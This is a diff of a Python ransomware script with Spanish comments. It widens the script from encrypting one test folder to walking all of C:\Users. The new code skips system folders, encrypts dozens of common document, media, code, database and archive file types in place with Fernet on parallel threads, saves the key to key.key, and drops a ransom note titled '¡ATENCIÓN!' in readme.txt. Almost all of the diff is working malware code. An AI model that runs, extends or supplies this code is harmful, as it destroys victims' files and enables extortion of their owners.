@@ -1,59 +1,80 @@
-import imp
-from importlib.resources import path
-#Librerias de criptografia para el cifrado
-from cryptography.fernet import Fernet
 import os
+from cryptography.fernet import Fernet
+from concurrent.futures import ThreadPoolExecutor
 
-#Funcion para generar la clave que cifrara los archivos 
+EXCLUIR_CARPETAS = [
+    'Program Files',
+    'Program Files (x86)',
+    'Windows',
+    '$Recycle.Bin',
+    'AppData',
+    'logs',
+    'C:\\Users\\rafa\\Desktop\\scripts'  # Carpeta adicional a excluir
+]
 
+EXTENSIONES_PERMITIDAS = [
+    '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw',  # imágenes
+    '.mp3', '.mp4', '.m4a', '.aac', '.ogg', '.flac', '.wav', '.wma', '.aiff', '.ape',  # música y sonido
+    '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp',  # vídeos y películas
+    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Microsoft Office
+    '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt',  # OpenOffice, Adobe, LaTeX, Markdown, etc.
+    '.yml', '.yaml', '.json', '.xml', '.csv',  # datos estructurados
+    '.db', '.sql', '.dbf', '.mdb', '.iso',  # bases de datos e imágenes de disco
+    '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css',  # tecnologías web
+    '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx',  # código fuente en C
+    '.java', '.class', '.jar',  # código fuente en Java
+    '.ps', '.bat', '.vb', '.vbs',  # scripts para Windows
+    '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift',  # scripts para Linux/Mac
+    '.go', '.py', '.pyc', '.bf', '.coffee',  # otros archivos de código fuente
+    '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak'  # formatos comprimidos
+]
 
 def generar_llave():
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
         key_file.write(key)
 
-
-#En esta funcion vamos a cargar la llave
-
 def cargar_llave():
     return open("key.key", "rb").read()
-    
-#Aqui encriptamos los archivos
-def encriptar(items, key):
-    #Aqui vamos a poner el metodo que ira encriptando los ficheros
-    x = Fernet(key)
-    #Aqui vamos a crear un bucle para que vaya recorriendo los elementos y mientras los 
-    #vaya cifrando
-    for item in items:
+
+def encriptar_archivo(item, key):
+    try:
         with open(item, "rb") as file:
             file_data = file.read()
-        encrypted_data = x.encrypt(file_data)
+        fernet = Fernet(key)
+        encrypted_data = fernet.encrypt(file_data)
         with open(item, "wb") as file:
             file.write(encrypted_data)
-            
+    except PermissionError:
+        print(f"No se pudo acceder al archivo: {item}")
+    except Exception as e:
+        print(f"Error al encriptar el archivo {item}: {e}")
 
+def obtener_archivos_en_directorio(path):
+    archivos = []
+    for root, _, files in os.walk(path):
+        if any(excluir in root for excluir in EXCLUIR_CARPETAS):
+            continue
+        for file in files:
+            if os.path.splitext(file)[1].lower() in EXTENSIONES_PERMITIDAS:
+                archivos.append(os.path.join(root, file))
+    return archivos
 
 if __name__ == "__main__":
-    #Aqui es donde va el path de los ficheros a encriptar
-    #||||||||[!!!!]MUCHO CUIDADO||||||||
-    path_to_encrypt = "C:\\Users\\rafa\\Desktop\\prueba"
-    #Esta es la lista de archivos dentro del path donde hemos descargado el ransom
-    items = os.listdir(path_to_encrypt)
-    #Esto es una lista por compresion,es un bucle for que va a efectuar el cifrado en cada 
-    #archivo del path
-    full_path = [path_to_encrypt + "/" + item for item in items]
+    # Directorio que se va a encriptar
+    path_to_encrypt = "C:\\Users"
 
+    # Obtener todos los archivos en el directorio y subdirectorios
+    items = obtener_archivos_en_directorio(path_to_encrypt)
 
+    # Generar y cargar la llave
+    generar_llave()
+    key = cargar_llave()
 
-#Activamos las funciones
-
-generar_llave()
-key = cargar_llave()
-#Con este metodo encriptamos con la llave cada uno de los archivos en el path
-encriptar(full_path, key)
-
-#Aqui vamos a poner el fichero donde pediremos el rescate
-ransom_note = """
+    # Encriptar los archivos en paralelo usando ThreadPoolExecutor
+    with ThreadPoolExecutor() as executor:
+        executor.map(lambda item: encriptar_archivo(item, key), items)
+    ransom_note = """
     ------------------------------------------
               ¡ATENCIÓN!
     ------------------------------------------
@@ -99,8 +120,8 @@ ransom_note = """
                           _/`.-'`.
                 _      _/` .  _.'
        ..:::::.(_)   /` _.'_./
-     .oooooooooo\ \o/.-'__.'o.
-    .ooooooooo`._\_|_.'`oooooob.
+     .oooooooooo\\ \\o/.-'__.'o.
+    .ooooooooo`._\\_|_.'`oooooob.
   .ooooooooooooooooooooo&&oooooob.
  .oooooooooooooooooooo&@@@@@@oooob.
 .ooooooooooooooooooooooo&&@@@@@ooob.
@@ -119,6 +140,7 @@ dooooooooooooooooooooooooo&@@oooooob
          `"""""""' `""""""'
     """
     
-    # Guardar la nota de rescate en un archivo
-with open(os.path.join(path_to_encrypt, "readme.txt"), "w") as file:
-    file.write(ransom_note)
+
+    # Crear el archivo de readme en el directorio de trabajo actual
+    with open("readme.txt", "w") as file:
+        file.write(ransom_note)
